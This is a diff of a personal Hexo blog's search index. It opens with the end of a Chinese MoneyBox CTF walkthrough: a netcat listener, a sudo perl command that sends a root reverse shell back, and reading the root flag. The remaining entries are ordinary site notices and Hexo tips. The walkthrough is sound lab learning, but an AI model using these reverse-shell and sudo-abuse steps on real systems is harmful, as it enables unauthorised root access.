+<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step21.jpg" alt="step21.jpg"></li>
+<li>kali 通过nc命令监听1234端口<pre class="line-numbers language-none"><code class="language-none">nc -lnvp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step22.jpg" alt="step22.jpg"></li>
+<li>靶机上通过sudo 运行p.php程序<pre class="line-numbers language-none"><code class="language-none">sudo /usr/bin/perl p.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step23.jpg" alt="step23.jpg"></li>
+<li>切换到渗透机kali，成功反弹管理员权限shell<pre class="line-numbers language-none"><code class="language-none">id
+cd /root
+ls -a
+cat .root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step24.jpg" alt="step24.jpg"></li>
+<li>拿到最终flag啦！<pre class="line-numbers language-none"><code class="language-none">Congratulations.......!
+
+You Successfully completed MoneyBox
+
+Finally The Root Flag
+    ==&gt; r00t{H4ckth3p14n3t}
+
+I'm Kirthik-KarvendhanT
+    It's My First CTF Box
+         
+instagram : ____kirthik____
+
+See You Back....<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p>
+</body></html>]]></content>
+      <tags>
+        <tag>学习</tag>
+        <tag>靶机解析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>再来一次</title>
+    <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p>
 </body></html>]]></content>
       <tags>
         <tag>告示</tag>
@@ -460,9 +452,26 @@ int main()
       </tags>
   </entry>
   <entry>
-    <title>创建个人主页！</title>
-    <url>/2023/06/28/hello-world/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>没啥事干所以就创建了<br>这里多半会写课上的笔记<br>在hexo中遇到的技术难关<br>请多指教</p>
+    <title>目前的进展</title>
+    <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>参考<code><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/">https://asdfv1929.github.io/2018/01/25/crash-cheat/</a></code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<b>超级慢</b></p>
 </body></html>]]></content>
+      <tags>
+        <tag>告示</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>要置顶的公告</title>
+    <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/9/5 更新：<br>超绝帅气的介绍页进入页面已经<s>借助chatgpt的伟力</s>完成了<br>后期完善会在那里加点分支<br>还有就是随笔啥的多半会加到里面 博客主题仅分享学术内容好了<br>2023/10/22 更新:<br>c语言这块还差一点收尾的环节<br>介绍一下新环节 靶机分析<br>课上讲过的再通过图文还原一下<br>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"></p>
+<p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p>
+<p>ps:<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong></p>
+<p>无渲染跳转方式: 在文章前加入</p>
+<pre class="line-numbers language-none"><code class="language-none">---
+layout: false 
+--- <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></body></html>]]></content>
+      <tags>
+        <tag>告示</tag>
+      </tags>
   </entry>
 </search>
